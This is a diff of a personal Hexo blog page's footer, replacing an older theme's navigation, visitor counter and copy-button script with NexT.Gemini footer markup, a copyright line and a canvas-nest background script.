+                <a href="/2025/03/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%A7%AF%E7%B4%AF/" rel="next" title="文件上传的一些积累">
+                  文件上传的一些积累 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2024 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">3m</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">45:12</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
     </div>
-    
-    <div class="footer-right">
-        <nav>
-            <ul>
-                <!--
-                --><li><a href="/">H0me</a></li><!--
-                --><!--
-                --><li><a href="/about/">A6out</a></li><!--
-                --><!--
-                --><li><a href="/tags/">T6gs</a></li><!--
-                --><!--
-                --><li><a href="/categories/">Catagory</a></li><!--
-                --><!--
-                --><li><a href="/links/">L1nks</a></li><!--
-                --><!--
-                --><li><a href="/search/">s4arch</a></li><!--
-                -->
-            </ul>
-            <ul>
-                
-                <!-- 不蒜子统计 -->
-                <span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
-                <span class="post-meta-divider">|</span>
-                <span id="busuanzi_container_site_uv" style='display:none'>本站访客数<span id="busuanzi_value_site_uv"></span>人</span>
-                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-                
-            </ul>
-        </nav>
-    </div>
-</footer>
-
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
+  </footer>
 
   
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
 
-
-<script src="/js/main.js"></script>
-
-<!-- search -->
-
-<!-- Baidu Analytics -->
-
-<!-- Cloudflare Analytics -->
-
-<!-- Disqus Comments -->
-
-<!-- utterances Comments -->
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
 
 </body>
 </html>
